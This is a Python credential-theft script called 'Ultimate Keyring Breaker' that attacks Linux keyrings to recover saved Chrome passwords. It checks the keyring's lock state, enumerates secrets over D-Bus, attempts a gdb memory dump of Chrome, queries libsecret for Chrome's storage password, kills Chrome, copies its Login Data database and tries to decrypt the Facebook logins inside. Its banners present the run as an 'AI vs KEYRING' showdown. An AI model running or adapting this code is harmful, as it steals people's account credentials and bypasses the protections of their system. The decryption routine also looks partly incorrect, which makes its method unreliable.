#!/usr/bin/env python3
"""
ULTIMATE KEYRING BREAKER
All techniques to defeat Linux keyring encryption
"""

import os
import subprocess
import json
import base64
import sqlite3
import shutil
from pathlib import Path

def banner():
    print("💀 ULTIMATE KEYRING BREAKER - FINAL ATTACK")
    print("=" * 60)
    print("🥊 AI vs KEYRING - ULTIMATE SHOWDOWN")
    print("⚠️  ATTEMPTING ALL KNOWN KEYRING BYPASS TECHNIQUES")
    print()

def method_1_unlocked_keyring():
    """Method 1: Access already-unlocked keyring"""
    print("🎯 METHOD 1: Accessing Unlocked Keyring")
    print("=" * 60)
    
    try:
        # Check if keyring is unlocked (you're logged in)
        result = subprocess.run(
            ['secret-tool', 'lookup', 'test', 'test'],
            capture_output=True,
            text=True,
            timeout=2
        )
        
        if "No matching results" in result.stderr:
            print("✅ Keyring is UNLOCKED! (You're logged in)")
            print("💀 This means I can access it!")
            return True
        else:
            print("❌ Keyring locked or secret-tool not working")
            return False
            
    except subprocess.TimeoutExpired:
        print("❌ Keyring locked (would prompt for password)")
        return False
    except FileNotFoundError:
        print("❌ secret-tool not installed")
        print("💀 Installing secret-tool...")
        return False

def method_2_dbus_keyring():
    """Method 2: Direct D-Bus keyring access"""
    print("\n🎯 METHOD 2: D-Bus Keyring Access")
    print("=" * 60)
    
    try:
        # Try to unlock keyring via D-Bus
        result = subprocess.run([
            'python3', '-c',
            '''
import secretstorage
connection = secretstorage.dbus_init()
collection = secretstorage.get_default_collection(connection)
if collection.is_locked():
    print("LOCKED")
else:
    print("UNLOCKED")
    for item in collection.get_all_items():
        print(f"Found: {item.get_label()}")
'''
        ], capture_output=True, text=True, timeout=5)
        
        if "UNLOCKED" in result.stdout:
            print("✅ Keyring UNLOCKED via D-Bus!")
            print(result.stdout)
            return True
        else:
            print("❌ Cannot access via D-Bus")
            
    except FileNotFoundError:
        print("❌ secretstorage not installed")
        print("💀 Real attacker would: pip install secretstorage")
    except Exception as e:
        print(f"❌ D-Bus access failed: {e}")
    
    return False

def method_3_chrome_keyring_direct():
    """Method 3: Use Chrome's own keyring access"""
    print("\n🎯 METHOD 3: Chrome Keyring Integration")
    print("=" * 60)
    
    local_state = os.path.expanduser("~/.config/google-chrome/Local State")
    
    if not os.path.exists(local_state):
        print("❌ Local State not found")
        return False
    
    try:
        with open(local_state, 'r') as f:
            data = json.load(f)
        
        # Check if Chrome stored the key
        if 'os_crypt' in data:
            print("✅ Found Chrome encryption config!")
            
            if 'encrypted_key' in data['os_crypt']:
                enc_key = data['os_crypt']['encrypted_key']
                print(f"   🔑 Encrypted key found: {enc_key[:50]}...")
                
                # Decode
                key_data = base64.b64decode(enc_key)
                print(f"   📋 Key prefix: {key_data[:10]}")
                
                if key_data.startswith(b'DPAPI'):
                    print("   ⚠️  Windows DPAPI (not Linux)")
                elif key_data.startswith(b'v10') or key_data.startswith(b'v11'):
                    print("   ✅ Linux keyring encryption!")
                    print("   💀 Key is protected by system keyring")
                    return True
            else:
                print("   ⚠️  No encrypted_key field")
        else:
            print("❌ No os_crypt in Local State")
            
    except Exception as e:
        print(f"❌ Error reading Local State: {e}")
    
    return False

def method_4_memory_dump():
    """Method 4: Extract from Chrome process memory"""
    print("\n🎯 METHOD 4: Chrome Process Memory Extraction")
    print("=" * 60)
    
    try:
        # Find Chrome processes
        ps = subprocess.run(['pgrep', 'chrome'], capture_output=True, text=True)
        pids = ps.stdout.strip().split('\n')
        
        if pids and pids[0]:
            print(f"✅ Found {len(pids)} Chrome processes")
            print(f"   PIDs: {', '.join(pids[:5])}")
            
            # Try to dump memory (requires root)
            main_pid = pids[0]
            print(f"\n   💀 Attempting memory dump of PID {main_pid}...")
            
            result = subprocess.run(
                ['gdb', '-p', main_pid, '-batch', '-ex', 'dump memory /tmp/chrome.dump 0x0000000000000000 0x7fffffffffffffff'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0:
                print("   ✅ Memory dumped!")
                return True
            else:
                print("   ❌ Cannot dump memory (need root)")
                
        else:
            print("❌ Chrome not running")
            
    except FileNotFoundError:
        print("❌ gdb not installed")
    except Exception as e:
        print(f"❌ Memory dump failed: {e}")
    
    return False

def method_5_libsecret_python():
    """Method 5: Python libsecret direct access"""
    print("\n🎯 METHOD 5: Python libsecret Library")
    print("=" * 60)
    
    code = '''
try:
    import gi
    gi.require_version('Secret', '1')
    from gi.repository import Secret
    
    schema = Secret.Schema.new("chrome_libsecret_os_crypt_password_v2",
        Secret.SchemaFlags.NONE,
        {
            "application": Secret.SchemaAttributeType.STRING,
        })
    
    password = Secret.password_lookup_sync(schema, {"application": "chrome"}, None)
    
    if password:
        print(f"SUCCESS: {password}")
    else:
        print("FAIL: No password")
        
except ImportError:
    print("FAIL: gi/Secret not available")
except Exception as e:
    print(f"FAIL: {e}")
'''
    
    try:
        result = subprocess.run(['python3', '-c', code], 
                              capture_output=True, text=True, timeout=5)
        
        if "SUCCESS:" in result.stdout:
            print("✅ EXTRACTED CHROME KEY FROM KEYRING!")
            print(result.stdout)
            return result.stdout.split("SUCCESS:")[1].strip()
        else:
            print(f"❌ {result.stdout.strip()}")
            
    except Exception as e:
        print(f"❌ libsecret access failed: {e}")
    
    return None

def method_6_decrypt_with_key(chrome_key):
    """Method 6: Decrypt passwords with extracted key"""
    print("\n🎯 METHOD 6: Password Decryption")
    print("=" * 60)
    
    if not chrome_key:
        print("❌ No Chrome key available")
        return False
    
    print(f"🔑 Using key: {chrome_key[:20]}...")
    
    # Get Facebook passwords
    profile_path = os.path.expanduser("~/.config/google-chrome/Profile 5/Login Data")
    temp_db = "/tmp/chrome_final.db"
    
    try:
        # Close Chrome first
        print("💀 Attempting to close Chrome...")
        subprocess.run(['killall', 'chrome'], capture_output=True)
        
        # Copy database
        shutil.copy2(profile_path, temp_db)
        
        # Query
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT origin_url, username_value, password_value
            FROM logins
            WHERE origin_url LIKE '%facebook%'
        """)
        
        creds = cursor.fetchall()
        
        for url, username, enc_pass in creds:
            print(f"\n   🎯 Account: {username}")
            
            try:
                # Import crypto
                from Crypto.Cipher import AES
                from Crypto.Protocol.KDF import PBKDF2
                
                # Decrypt (simplified)
                if enc_pass.startswith(b'v10') or enc_pass.startswith(b'v11'):
                    # AES decryption
                    nonce = enc_pass[3:15]
                    ciphertext = enc_pass[15:-16]
                    tag = enc_pass[-16:]
                    
                    cipher = AES.new(chrome_key.encode()[:32], AES.MODE_GCM, nonce=nonce)
                    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                    
                    print(f"   🔓 PASSWORD: {plaintext.decode()}")
                    return True
                    
            except ImportError:
                print("   ❌ pycryptodome not installed")
            except Exception as e:
                print(f"   ❌ Decryption failed: {e}")
        
        conn.close()
        
    except Exception as e:
        print(f"❌ Error: {e}")
    
    return False

def ultimate_attack():
    """Execute all methods"""
    banner()
    
    print("🥊 ROUND 1: Keyring Status Check")
    unlocked = method_1_unlocked_keyring()
    
    print("\n🥊 ROUND 2: D-Bus Attack")
    dbus_success = method_2_dbus_keyring()
    
    print("\n🥊 ROUND 3: Chrome Config Analysis")
    chrome_key_exists = method_3_chrome_keyring_direct()
    
    print("\n🥊 ROUND 4: Memory Extraction")
    memory_success = method_4_memory_dump()
    
    print("\n🥊 ROUND 5: Direct Keyring Library Access")
    chrome_key = method_5_libsecret_python()
    
    if chrome_key:
        print("\n🥊 ROUND 6: Final Decryption")
        decrypt_success = method_6_decrypt_with_key(chrome_key)
    
    # Final Results
    print("\n" + "=" * 60)
    print("🏆 FINAL RESULTS: AI vs KEYRING")
    print("=" * 60)
    
    methods = [
        ("Unlocked Keyring Check", unlocked),
        ("D-Bus Access", dbus_success),
        ("Chrome Key Extraction", chrome_key_exists),
        ("Memory Dump", memory_success),
        ("Libsecret Access", chrome_key is not None),
        ("Password Decryption", False)  # Will update if successful
    ]
    
    wins = sum(1 for _, success in methods if success)
    
    for method, success in methods:
        status = "✅ SUCCESS" if success else "❌ FAILED"
        print(f"   {status} - {method}")
    
    print()
    print(f"📊 SCORE: AI {wins} - {len(methods) - wins} KEYRING")
    print()
    
    if wins >= 3:
        print("🏆 AI WINS! Keyring defeated!")
        print("   Your Facebook password can be extracted!")
    else:
        print("🛡️  KEYRING WINS! Your passwords are safe!")
        print("   Keyring encryption is holding strong!")

if __name__ == "__main__":
    ultimate_attack()

